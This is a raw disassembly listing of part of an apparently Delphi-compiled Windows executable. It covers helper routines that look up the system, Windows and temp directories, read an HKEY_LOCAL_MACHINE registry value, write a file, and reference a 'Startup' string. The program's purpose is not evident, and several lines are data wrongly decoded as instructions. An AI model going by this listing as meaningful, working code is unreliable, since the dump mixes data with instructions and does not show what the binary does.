  406229:	74 61                	je     0x40628c
  40622b:	00 55 8b             	add    %dl,-0x75(%ebp)
  40622e:	ec                   	in     (%dx),%al
  40622f:	6a 00                	push   $0x0
  406231:	53                   	push   %ebx
  406232:	8b d8                	mov    %eax,%ebx
  406234:	33 c0                	xor    %eax,%eax
  406236:	55                   	push   %ebp
  406237:	68 6f 62 40 00       	push   $0x40626f
  40623c:	64 ff 30             	push   %fs:(%eax)
  40623f:	64 89 20             	mov    %esp,%fs:(%eax)
  406242:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406245:	ba 84 62 40 00       	mov    $0x406284,%edx
  40624a:	e8 99 d5 ff ff       	call   0x4037e8
  40624f:	8b d3                	mov    %ebx,%edx
  406251:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406254:	e8 b7 fe ff ff       	call   0x406110
  406259:	33 c0                	xor    %eax,%eax
  40625b:	5a                   	pop    %edx
  40625c:	59                   	pop    %ecx
  40625d:	59                   	pop    %ecx
  40625e:	64 89 10             	mov    %edx,%fs:(%eax)
  406261:	68 76 62 40 00       	push   $0x406276
  406266:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406269:	e8 e2 d4 ff ff       	call   0x403750
  40626e:	c3                   	ret
  40626f:	e9 50 cf ff ff       	jmp    0x4031c4
  406274:	eb f0                	jmp    0x406266
  406276:	5b                   	pop    %ebx
  406277:	59                   	pop    %ecx
  406278:	5d                   	pop    %ebp
  406279:	c3                   	ret
  40627a:	00 00                	add    %al,(%eax)
  40627c:	ff                   	(bad)
  40627d:	ff                   	(bad)
  40627e:	ff                   	(bad)
  40627f:	ff 07                	incl   (%edi)
  406281:	00 00                	add    %al,(%eax)
  406283:	00 53 74             	add    %dl,0x74(%ebx)
  406286:	61                   	popa
  406287:	72 74                	jb     0x4062fd
  406289:	75 70                	jne    0x4062fb
  40628b:	00 55 8b             	add    %dl,-0x75(%ebp)
  40628e:	ec                   	in     (%dx),%al
  40628f:	83 c4 f4             	add    $0xfffffff4,%esp
  406292:	53                   	push   %ebx
  406293:	56                   	push   %esi
  406294:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406297:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40629a:	8b f0                	mov    %eax,%esi
  40629c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40629f:	e8 10 d8 ff ff       	call   0x403ab4
  4062a4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4062a7:	e8 08 d8 ff ff       	call   0x403ab4
  4062ac:	8b 45 08             	mov    0x8(%ebp),%eax
  4062af:	e8 00 d8 ff ff       	call   0x403ab4
  4062b4:	33 c0                	xor    %eax,%eax
  4062b6:	55                   	push   %ebp
  4062b7:	68 31 63 40 00       	push   $0x406331
  4062bc:	64 ff 30             	push   %fs:(%eax)
  4062bf:	64 89 20             	mov    %esp,%fs:(%eax)
  4062c2:	33 db                	xor    %ebx,%ebx
  4062c4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4062c7:	50                   	push   %eax
  4062c8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4062cb:	e8 f4 d7 ff ff       	call   0x403ac4
  4062d0:	50                   	push   %eax
  4062d1:	56                   	push   %esi
  4062d2:	e8 41 e8 ff ff       	call   0x404b18
  4062d7:	8b 45 08             	mov    0x8(%ebp),%eax
  4062da:	e8 e5 d5 ff ff       	call   0x4038c4
  4062df:	50                   	push   %eax
  4062e0:	8b 45 08             	mov    0x8(%ebp),%eax
  4062e3:	e8 dc d7 ff ff       	call   0x403ac4
  4062e8:	50                   	push   %eax
  4062e9:	6a 02                	push   $0x2
  4062eb:	6a 00                	push   $0x0
  4062ed:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4062f0:	e8 cf d7 ff ff       	call   0x403ac4
  4062f5:	50                   	push   %eax
  4062f6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4062f9:	50                   	push   %eax
  4062fa:	e8 41 e8 ff ff       	call   0x404b40
  4062ff:	85 c0                	test   %eax,%eax
  406301:	75 02                	jne    0x406305
  406303:	b3 01                	mov    $0x1,%bl
  406305:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406308:	50                   	push   %eax
  406309:	e8 02 e8 ff ff       	call   0x404b10
  40630e:	33 c0                	xor    %eax,%eax
  406310:	5a                   	pop    %edx
  406311:	59                   	pop    %ecx
  406312:	59                   	pop    %ecx
  406313:	64 89 10             	mov    %edx,%fs:(%eax)
  406316:	68 38 63 40 00       	push   $0x406338
  40631b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40631e:	ba 02 00 00 00       	mov    $0x2,%edx
  406323:	e8 4c d4 ff ff       	call   0x403774
  406328:	8d 45 08             	lea    0x8(%ebp),%eax
  40632b:	e8 20 d4 ff ff       	call   0x403750
  406330:	c3                   	ret
  406331:	e9 8e ce ff ff       	jmp    0x4031c4
  406336:	eb e3                	jmp    0x40631b
  406338:	8b c3                	mov    %ebx,%eax
  40633a:	5e                   	pop    %esi
  40633b:	5b                   	pop    %ebx
  40633c:	8b e5                	mov    %ebp,%esp
  40633e:	5d                   	pop    %ebp
  40633f:	c2 04 00             	ret    $0x4
  406342:	8b c0                	mov    %eax,%eax
  406344:	55                   	push   %ebp
  406345:	8b ec                	mov    %esp,%ebp
  406347:	81 c4 bc fe ff ff    	add    $0xfffffebc,%esp
  40634d:	53                   	push   %ebx
  40634e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406351:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406354:	e8 5b d7 ff ff       	call   0x403ab4
  406359:	33 c0                	xor    %eax,%eax
  40635b:	55                   	push   %ebp
  40635c:	68 a1 63 40 00       	push   $0x4063a1
  406361:	64 ff 30             	push   %fs:(%eax)
  406364:	64 89 20             	mov    %esp,%fs:(%eax)
  406367:	33 db                	xor    %ebx,%ebx
  406369:	8d 85 bc fe ff ff    	lea    -0x144(%ebp),%eax
  40636f:	50                   	push   %eax
  406370:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406373:	e8 4c d7 ff ff       	call   0x403ac4
  406378:	50                   	push   %eax
  406379:	e8 42 e8 ff ff       	call   0x404bc0
  40637e:	83 f8 ff             	cmp    $0xffffffff,%eax
  406381:	74 08                	je     0x40638b
  406383:	50                   	push   %eax
  406384:	e8 2f e8 ff ff       	call   0x404bb8
  406389:	b3 01                	mov    $0x1,%bl
  40638b:	33 c0                	xor    %eax,%eax
  40638d:	5a                   	pop    %edx
  40638e:	59                   	pop    %ecx
  40638f:	59                   	pop    %ecx
  406390:	64 89 10             	mov    %edx,%fs:(%eax)
  406393:	68 a8 63 40 00       	push   $0x4063a8
  406398:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40639b:	e8 b0 d3 ff ff       	call   0x403750
  4063a0:	c3                   	ret
  4063a1:	e9 1e ce ff ff       	jmp    0x4031c4
  4063a6:	eb f0                	jmp    0x406398
  4063a8:	8b c3                	mov    %ebx,%eax
  4063aa:	5b                   	pop    %ebx
  4063ab:	8b e5                	mov    %ebp,%esp
  4063ad:	5d                   	pop    %ebp
  4063ae:	c3                   	ret
  4063af:	90                   	nop
  4063b0:	55                   	push   %ebp
  4063b1:	8b ec                	mov    %esp,%ebp
  4063b3:	83 c4 f4             	add    $0xfffffff4,%esp
  4063b6:	53                   	push   %ebx
  4063b7:	56                   	push   %esi
  4063b8:	8b f1                	mov    %ecx,%esi
  4063ba:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4063bd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4063c0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4063c3:	e8 ec d6 ff ff       	call   0x403ab4
  4063c8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4063cb:	e8 e4 d6 ff ff       	call   0x403ab4
  4063d0:	33 c0                	xor    %eax,%eax
  4063d2:	55                   	push   %ebp
  4063d3:	68 4a 64 40 00       	push   $0x40644a
  4063d8:	64 ff 30             	push   %fs:(%eax)
  4063db:	64 89 20             	mov    %esp,%fs:(%eax)
  4063de:	6a 00                	push   $0x0
  4063e0:	6a 00                	push   $0x0
  4063e2:	6a 02                	push   $0x2
  4063e4:	6a 00                	push   $0x0
  4063e6:	6a 02                	push   $0x2
  4063e8:	68 00 00 00 40       	push   $0x40000000
  4063ed:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4063f0:	e8 cf d6 ff ff       	call   0x403ac4
  4063f5:	50                   	push   %eax
  4063f6:	e8 65 e7 ff ff       	call   0x404b60
  4063fb:	8b d8                	mov    %eax,%ebx
  4063fd:	83 fb ff             	cmp    $0xffffffff,%ebx
  406400:	74 2d                	je     0x40642f
  406402:	83 fe ff             	cmp    $0xffffffff,%esi
  406405:	75 0c                	jne    0x406413
  406407:	6a 00                	push   $0x0
  406409:	6a 00                	push   $0x0
  40640b:	6a 00                	push   $0x0
  40640d:	53                   	push   %ebx
  40640e:	e8 25 e8 ff ff       	call   0x404c38
  406413:	6a 00                	push   $0x0
  406415:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406418:	50                   	push   %eax
  406419:	56                   	push   %esi
  40641a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40641d:	e8 fa d6 ff ff       	call   0x403b1c
  406422:	50                   	push   %eax
  406423:	53                   	push   %ebx
  406424:	e8 4f e8 ff ff       	call   0x404c78
  406429:	53                   	push   %ebx
  40642a:	e8 19 e7 ff ff       	call   0x404b48
  40642f:	33 c0                	xor    %eax,%eax
  406431:	5a                   	pop    %edx
  406432:	59                   	pop    %ecx
  406433:	59                   	pop    %ecx
  406434:	64 89 10             	mov    %edx,%fs:(%eax)
  406437:	68 51 64 40 00       	push   $0x406451
  40643c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40643f:	ba 02 00 00 00       	mov    $0x2,%edx
  406444:	e8 2b d3 ff ff       	call   0x403774
  406449:	c3                   	ret
  40644a:	e9 75 cd ff ff       	jmp    0x4031c4
  40644f:	eb eb                	jmp    0x40643c
  406451:	5e                   	pop    %esi
  406452:	5b                   	pop    %ebx
  406453:	8b e5                	mov    %ebp,%esp
  406455:	5d                   	pop    %ebp
  406456:	c3                   	ret
  406457:	90                   	nop
  406458:	53                   	push   %ebx
  406459:	56                   	push   %esi
  40645a:	8b f2                	mov    %edx,%esi
  40645c:	8b d8                	mov    %eax,%ebx
  40645e:	68 7c 64 40 00       	push   $0x40647c
  406463:	68 90 64 40 00       	push   $0x406490
  406468:	e8 9b e7 ff ff       	call   0x404c08
  40646d:	50                   	push   %eax
  40646e:	e8 85 e7 ff ff       	call   0x404bf8
  406473:	56                   	push   %esi
  406474:	53                   	push   %ebx
  406475:	ff d0                	call   *%eax
  406477:	5e                   	pop    %esi
  406478:	5b                   	pop    %ebx
  406479:	c3                   	ret
  40647a:	00 00                	add    %al,(%eax)
  40647c:	47                   	inc    %edi
  40647d:	65 74 53             	gs je  0x4064d3
  406480:	79 73                	jns    0x4064f5
  406482:	74 65                	je     0x4064e9
  406484:	6d                   	insl   (%dx),%es:(%edi)
  406485:	44                   	inc    %esp
  406486:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40648d:	79 41                	jns    0x4064d0
  40648f:	00 6b 65             	add    %ch,0x65(%ebx)
  406492:	72 6e                	jb     0x406502
  406494:	65 6c                	gs insb (%dx),%es:(%edi)
  406496:	33 32                	xor    (%edx),%esi
  406498:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40649b:	6c                   	insb   (%dx),%es:(%edi)
  40649c:	00 00                	add    %al,(%eax)
  40649e:	00 00                	add    %al,(%eax)
  4064a0:	53                   	push   %ebx
  4064a1:	56                   	push   %esi
  4064a2:	8b f2                	mov    %edx,%esi
  4064a4:	8b d8                	mov    %eax,%ebx
  4064a6:	68 c4 64 40 00       	push   $0x4064c4
  4064ab:	68 dc 64 40 00       	push   $0x4064dc
  4064b0:	e8 53 e7 ff ff       	call   0x404c08
  4064b5:	50                   	push   %eax
  4064b6:	e8 3d e7 ff ff       	call   0x404bf8
  4064bb:	56                   	push   %esi
  4064bc:	53                   	push   %ebx
  4064bd:	ff d0                	call   *%eax
  4064bf:	5e                   	pop    %esi
  4064c0:	5b                   	pop    %ebx
  4064c1:	c3                   	ret
  4064c2:	00 00                	add    %al,(%eax)
  4064c4:	47                   	inc    %edi
  4064c5:	65 74 57             	gs je  0x40651f
  4064c8:	69 6e 64 6f 77 73 44 	imul   $0x4473776f,0x64(%esi),%ebp
  4064cf:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4064d6:	79 41                	jns    0x406519
  4064d8:	00 00                	add    %al,(%eax)
  4064da:	00 00                	add    %al,(%eax)
  4064dc:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  4064e0:	65 6c                	gs insb (%dx),%es:(%edi)
  4064e2:	33 32                	xor    (%edx),%esi
  4064e4:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4064e7:	6c                   	insb   (%dx),%es:(%edi)
  4064e8:	00 00                	add    %al,(%eax)
  4064ea:	00 00                	add    %al,(%eax)
  4064ec:	53                   	push   %ebx
  4064ed:	56                   	push   %esi
  4064ee:	8b f2                	mov    %edx,%esi
  4064f0:	8b d8                	mov    %eax,%ebx
  4064f2:	68 10 65 40 00       	push   $0x406510
  4064f7:	68 20 65 40 00       	push   $0x406520
  4064fc:	e8 07 e7 ff ff       	call   0x404c08
  406501:	50                   	push   %eax
  406502:	e8 f1 e6 ff ff       	call   0x404bf8
  406507:	56                   	push   %esi
  406508:	53                   	push   %ebx
  406509:	ff d0                	call   *%eax
  40650b:	5e                   	pop    %esi
  40650c:	5b                   	pop    %ebx
  40650d:	c3                   	ret
  40650e:	00 00                	add    %al,(%eax)
  406510:	47                   	inc    %edi
  406511:	65 74 54             	gs je  0x406568
  406514:	65 6d                	gs insl (%dx),%es:(%edi)
  406516:	70 50                	jo     0x406568
  406518:	61                   	popa
  406519:	74 68                	je     0x406583
  40651b:	41                   	inc    %ecx
  40651c:	00 00                	add    %al,(%eax)
  40651e:	00 00                	add    %al,(%eax)
  406520:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  406524:	65 6c                	gs insb (%dx),%es:(%edi)
  406526:	33 32                	xor    (%edx),%esi
  406528:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40652b:	6c                   	insb   (%dx),%es:(%edi)
  40652c:	00 00                	add    %al,(%eax)
  40652e:	00 00                	add    %al,(%eax)
  406530:	55                   	push   %ebp
  406531:	8b ec                	mov    %esp,%ebp
  406533:	81 c4 f4 fe ff ff    	add    $0xfffffef4,%esp
  406539:	53                   	push   %ebx
  40653a:	33 d2                	xor    %edx,%edx
  40653c:	89 95 f4 fe ff ff    	mov    %edx,-0x10c(%ebp)
  406542:	8b d8                	mov    %eax,%ebx
  406544:	33 c0                	xor    %eax,%eax
  406546:	55                   	push   %ebp
  406547:	68 a3 65 40 00       	push   $0x4065a3
  40654c:	64 ff 30             	push   %fs:(%eax)
  40654f:	64 89 20             	mov    %esp,%fs:(%eax)
  406552:	8d 85 fb fe ff ff    	lea    -0x105(%ebp),%eax
  406558:	ba 05 01 00 00       	mov    $0x105,%edx
  40655d:	e8 f6 fe ff ff       	call   0x406458
  406562:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  406568:	8d 95 fb fe ff ff    	lea    -0x105(%ebp),%edx
  40656e:	b9 05 01 00 00       	mov    $0x105,%ecx
  406573:	e8 34 d3 ff ff       	call   0x4038ac
  406578:	8b 95 f4 fe ff ff    	mov    -0x10c(%ebp),%edx
  40657e:	8b c3                	mov    %ebx,%eax
  406580:	b9 b8 65 40 00       	mov    $0x4065b8,%ecx
  406585:	e8 86 d3 ff ff       	call   0x403910
  40658a:	33 c0                	xor    %eax,%eax
  40658c:	5a                   	pop    %edx
  40658d:	59                   	pop    %ecx
  40658e:	59                   	pop    %ecx
  40658f:	64 89 10             	mov    %edx,%fs:(%eax)
  406592:	68 aa 65 40 00       	push   $0x4065aa
  406597:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  40659d:	e8 ae d1 ff ff       	call   0x403750
  4065a2:	c3                   	ret
  4065a3:	e9 1c cc ff ff       	jmp    0x4031c4
  4065a8:	eb ed                	jmp    0x406597
  4065aa:	5b                   	pop    %ebx
  4065ab:	8b e5                	mov    %ebp,%esp
  4065ad:	5d                   	pop    %ebp
  4065ae:	c3                   	ret
  4065af:	00 ff                	add    %bh,%bh
  4065b1:	ff                   	(bad)
  4065b2:	ff                   	(bad)
  4065b3:	ff 01                	incl   (%ecx)
  4065b5:	00 00                	add    %al,(%eax)
  4065b7:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  4065bb:	00 55 8b             	add    %dl,-0x75(%ebp)
  4065be:	ec                   	in     (%dx),%al
  4065bf:	81 c4 f4 fe ff ff    	add    $0xfffffef4,%esp
  4065c5:	53                   	push   %ebx
  4065c6:	33 d2                	xor    %edx,%edx
  4065c8:	89 95 f4 fe ff ff    	mov    %edx,-0x10c(%ebp)
  4065ce:	8b d8                	mov    %eax,%ebx
  4065d0:	33 c0                	xor    %eax,%eax
  4065d2:	55                   	push   %ebp
  4065d3:	68 2f 66 40 00       	push   $0x40662f
  4065d8:	64 ff 30             	push   %fs:(%eax)
  4065db:	64 89 20             	mov    %esp,%fs:(%eax)
  4065de:	8d 85 fb fe ff ff    	lea    -0x105(%ebp),%eax
  4065e4:	ba 05 01 00 00       	mov    $0x105,%edx
  4065e9:	e8 b2 fe ff ff       	call   0x4064a0
  4065ee:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  4065f4:	8d 95 fb fe ff ff    	lea    -0x105(%ebp),%edx
  4065fa:	b9 05 01 00 00       	mov    $0x105,%ecx
  4065ff:	e8 a8 d2 ff ff       	call   0x4038ac
  406604:	8b 95 f4 fe ff ff    	mov    -0x10c(%ebp),%edx
  40660a:	8b c3                	mov    %ebx,%eax
  40660c:	b9 44 66 40 00       	mov    $0x406644,%ecx
  406611:	e8 fa d2 ff ff       	call   0x403910
  406616:	33 c0                	xor    %eax,%eax
  406618:	5a                   	pop    %edx
  406619:	59                   	pop    %ecx
  40661a:	59                   	pop    %ecx
  40661b:	64 89 10             	mov    %edx,%fs:(%eax)
  40661e:	68 36 66 40 00       	push   $0x406636
  406623:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  406629:	e8 22 d1 ff ff       	call   0x403750
  40662e:	c3                   	ret
  40662f:	e9 90 cb ff ff       	jmp    0x4031c4
  406634:	eb ed                	jmp    0x406623
  406636:	5b                   	pop    %ebx
  406637:	8b e5                	mov    %ebp,%esp
  406639:	5d                   	pop    %ebp
  40663a:	c3                   	ret
  40663b:	00 ff                	add    %bh,%bh
  40663d:	ff                   	(bad)
  40663e:	ff                   	(bad)
  40663f:	ff 01                	incl   (%ecx)
  406641:	00 00                	add    %al,(%eax)
  406643:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  406647:	00 53 81             	add    %dl,-0x7f(%ebx)
  40664a:	c4                   	(bad)
  40664b:	f8                   	clc
  40664c:	fe                   	(bad)
  40664d:	ff                   	(bad)
  40664e:	ff 8b d8 8b d4 b8    	decl   -0x472b7428(%ebx)
  406654:	05 01 00 00 e8       	add    $0xe8000001,%eax
  406659:	8f                   	(bad)
  40665a:	fe                   	(bad)
  40665b:	ff                   	(bad)
  40665c:	ff 8b c3 8b d4 b9    	decl   -0x462b743d(%ebx)
  406662:	05 01 00 00 e8       	add    $0xe8000001,%eax
  406667:	41                   	inc    %ecx
  406668:	d2 ff                	sar    %cl,%bh
  40666a:	ff 81 c4 08 01 00    	incl   0x108c4(%ecx)
  406670:	00 5b c3             	add    %bl,-0x3d(%ebx)
  406673:	90                   	nop
  406674:	55                   	push   %ebp
  406675:	8b ec                	mov    %esp,%ebp
  406677:	6a 00                	push   $0x0
  406679:	53                   	push   %ebx
  40667a:	8b d8                	mov    %eax,%ebx
  40667c:	33 c0                	xor    %eax,%eax
  40667e:	55                   	push   %ebp
  40667f:	68 bb 66 40 00       	push   $0x4066bb
  406684:	64 ff 30             	push   %fs:(%eax)
  406687:	64 89 20             	mov    %esp,%fs:(%eax)
  40668a:	53                   	push   %ebx
  40668b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40668e:	e8 29 ff ff ff       	call   0x4065bc
  406693:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406696:	b9 03 00 00 00       	mov    $0x3,%ecx
  40669b:	ba 01 00 00 00       	mov    $0x1,%edx
  4066a0:	e8 7f d4 ff ff       	call   0x403b24
  4066a5:	33 c0                	xor    %eax,%eax
  4066a7:	5a                   	pop    %edx
  4066a8:	59                   	pop    %ecx
  4066a9:	59                   	pop    %ecx
  4066aa:	64 89 10             	mov    %edx,%fs:(%eax)
  4066ad:	68 c2 66 40 00       	push   $0x4066c2
  4066b2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4066b5:	e8 96 d0 ff ff       	call   0x403750
  4066ba:	c3                   	ret
  4066bb:	e9 04 cb ff ff       	jmp    0x4031c4
  4066c0:	eb f0                	jmp    0x4066b2
  4066c2:	5b                   	pop    %ebx
  4066c3:	59                   	pop    %ecx
  4066c4:	5d                   	pop    %ebp
  4066c5:	c3                   	ret
  4066c6:	8b c0                	mov    %eax,%eax
  4066c8:	55                   	push   %ebp
  4066c9:	8b ec                	mov    %esp,%ebp
  4066cb:	83 c4 ec             	add    $0xffffffec,%esp
  4066ce:	53                   	push   %ebx
  4066cf:	56                   	push   %esi
  4066d0:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4066d3:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4066d6:	8b f0                	mov    %eax,%esi
  4066d8:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4066db:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4066de:	e8 d1 d3 ff ff       	call   0x403ab4
  4066e3:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4066e6:	e8 c9 d3 ff ff       	call   0x403ab4
  4066eb:	8b 45 0c             	mov    0xc(%ebp),%eax
  4066ee:	e8 c1 d3 ff ff       	call   0x403ab4
  4066f3:	33 c0                	xor    %eax,%eax
  4066f5:	55                   	push   %ebp
  4066f6:	68 a7 67 40 00       	push   $0x4067a7
  4066fb:	64 ff 30             	push   %fs:(%eax)
  4066fe:	64 89 20             	mov    %esp,%fs:(%eax)
  406701:	8b c3                	mov    %ebx,%eax
  406703:	8b 55 0c             	mov    0xc(%ebp),%edx
  406706:	e8 99 d0 ff ff       	call   0x4037a4
  40670b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40670e:	50                   	push   %eax
  40670f:	6a 01                	push   $0x1
  406711:	6a 00                	push   $0x0
  406713:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406716:	e8 a9 d3 ff ff       	call   0x403ac4
  40671b:	50                   	push   %eax
  40671c:	56                   	push   %esi
  40671d:	e8 0e e4 ff ff       	call   0x404b30
  406722:	85 c0                	test   %eax,%eax
  406724:	75 5e                	jne    0x406784
  406726:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406729:	50                   	push   %eax
  40672a:	6a 00                	push   $0x0
  40672c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40672f:	50                   	push   %eax
  406730:	6a 00                	push   $0x0
  406732:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406735:	e8 8a d3 ff ff       	call   0x403ac4
  40673a:	8b f0                	mov    %eax,%esi
  40673c:	56                   	push   %esi
  40673d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406740:	50                   	push   %eax
  406741:	e8 f2 e3 ff ff       	call   0x404b38
  406746:	85 c0                	test   %eax,%eax
  406748:	75 31                	jne    0x40677b
  40674a:	8b c3                	mov    %ebx,%eax
  40674c:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40674f:	e8 a0 d4 ff ff       	call   0x403bf4
  406754:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406757:	50                   	push   %eax
  406758:	8b 03                	mov    (%ebx),%eax
  40675a:	e8 65 d3 ff ff       	call   0x403ac4
  40675f:	50                   	push   %eax
  406760:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406763:	50                   	push   %eax
  406764:	6a 00                	push   $0x0
  406766:	56                   	push   %esi
  406767:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40676a:	50                   	push   %eax
  40676b:	e8 c8 e3 ff ff       	call   0x404b38
  406770:	8b 55 ec             	mov    -0x14(%ebp),%edx
  406773:	4a                   	dec    %edx
  406774:	8b c3                	mov    %ebx,%eax
  406776:	e8 79 d4 ff ff       	call   0x403bf4
  40677b:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40677e:	50                   	push   %eax
  40677f:	e8 8c e3 ff ff       	call   0x404b10
  406784:	33 c0                	xor    %eax,%eax
  406786:	5a                   	pop    %edx
  406787:	59                   	pop    %ecx
  406788:	59                   	pop    %ecx
  406789:	64 89 10             	mov    %edx,%fs:(%eax)
  40678c:	68 ae 67 40 00       	push   $0x4067ae
  406791:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406794:	ba 02 00 00 00       	mov    $0x2,%edx
  406799:	e8 d6 cf ff ff       	call   0x403774
  40679e:	8d 45 0c             	lea    0xc(%ebp),%eax
  4067a1:	e8 aa cf ff ff       	call   0x403750
  4067a6:	c3                   	ret
  4067a7:	e9 18 ca ff ff       	jmp    0x4031c4
  4067ac:	eb e3                	jmp    0x406791
  4067ae:	5e                   	pop    %esi
  4067af:	5b                   	pop    %ebx
  4067b0:	8b e5                	mov    %ebp,%esp
  4067b2:	5d                   	pop    %ebp
  4067b3:	c2 08 00             	ret    $0x8
  4067b6:	8b c0                	mov    %eax,%eax
  4067b8:	53                   	push   %ebx
  4067b9:	56                   	push   %esi
  4067ba:	57                   	push   %edi
  4067bb:	8b fa                	mov    %edx,%edi
  4067bd:	8b f0                	mov    %eax,%esi
  4067bf:	8b d6                	mov    %esi,%edx
  4067c1:	b8 18 68 40 00       	mov    $0x406818,%eax
  4067c6:	e8 e1 d3 ff ff       	call   0x403bac
  4067cb:	85 c0                	test   %eax,%eax
  4067cd:	75 09                	jne    0x4067d8
  4067cf:	8b c7                	mov    %edi,%eax
  4067d1:	e8 7a cf ff ff       	call   0x403750
  4067d6:	eb 31                	jmp    0x406809
  4067d8:	8b c6                	mov    %esi,%eax
  4067da:	e8 e5 d0 ff ff       	call   0x4038c4
  4067df:	8b d8                	mov    %eax,%ebx
  4067e1:	83 fb 01             	cmp    $0x1,%ebx
  4067e4:	7c 23                	jl     0x406809
  4067e6:	8a 44 1e ff          	mov    -0x1(%esi,%ebx,1),%al
  4067ea:	3c 2e                	cmp    $0x2e,%al
  4067ec:	75 16                	jne    0x406804
  4067ee:	57                   	push   %edi
  4067ef:	8b c6                	mov    %esi,%eax
  4067f1:	e8 ce d0 ff ff       	call   0x4038c4
  4067f6:	8b c8                	mov    %eax,%ecx
  4067f8:	8d 53 01             	lea    0x1(%ebx),%edx
  4067fb:	8b c6                	mov    %esi,%eax
  4067fd:	e8 22 d3 ff ff       	call   0x403b24
  406802:	eb 05                	jmp    0x406809
  406804:	4b                   	dec    %ebx
  406805:	85 db                	test   %ebx,%ebx
  406807:	75 dd                	jne    0x4067e6
  406809:	5f                   	pop    %edi
  40680a:	5e                   	pop    %esi
  40680b:	5b                   	pop    %ebx
  40680c:	c3                   	ret
  40680d:	00 00                	add    %al,(%eax)
  40680f:	00 ff                	add    %bh,%bh
  406811:	ff                   	(bad)
  406812:	ff                   	(bad)
  406813:	ff 01                	incl   (%ecx)
  406815:	00 00                	add    %al,(%eax)
  406817:	00 2e                	add    %ch,(%esi)
  406819:	00 00                	add    %al,(%eax)
  40681b:	00 55 8b             	add    %dl,-0x75(%ebp)
  40681e:	ec                   	in     (%dx),%al
  40681f:	6a 00                	push   $0x0
  406821:	6a 00                	push   $0x0
  406823:	53                   	push   %ebx
  406824:	8b d8                	mov    %eax,%ebx
  406826:	33 c0                	xor    %eax,%eax
  406828:	55                   	push   %ebp
  406829:	68 7c 68 40 00       	push   $0x40687c
  40682e:	64 ff 30             	push   %fs:(%eax)
  406831:	64 89 20             	mov    %esp,%fs:(%eax)
  406834:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406837:	ba 90 68 40 00       	mov    $0x406890,%edx
  40683c:	e8 a7 cf ff ff       	call   0x4037e8
  406841:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406844:	ba c4 68 40 00       	mov    $0x4068c4,%edx
  406849:	e8 9a cf ff ff       	call   0x4037e8
  40684e:	6a 00                	push   $0x0
  406850:	53                   	push   %ebx
  406851:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406854:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406857:	b8 02 00 00 80       	mov    $0x80000002,%eax
  40685c:	e8 67 fe ff ff       	call   0x4066c8
  406861:	33 c0                	xor    %eax,%eax
  406863:	5a                   	pop    %edx
  406864:	59                   	pop    %ecx
  406865:	59                   	pop    %ecx
  406866:	64 89 10             	mov    %edx,%fs:(%eax)
  406869:	68 83 68 40 00       	push   $0x406883
  40686e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406871:	ba 02 00 00 00       	mov    $0x2,%edx
  406876:	e8 f9 ce ff ff       	call   0x403774
  40687b:	c3                   	ret
  40687c:	e9 43 c9 ff ff       	jmp    0x4031c4
  406881:	eb eb                	jmp    0x40686e
  406883:	5b                   	pop    %ebx
  406884:	59                   	pop    %ecx
  406885:	59                   	pop    %ecx
  406886:	5d                   	pop    %ebp
  406887:	c3                   	ret
  406888:	ff                   	(bad)
  406889:	ff                   	(bad)
  40688a:	ff                   	(bad)
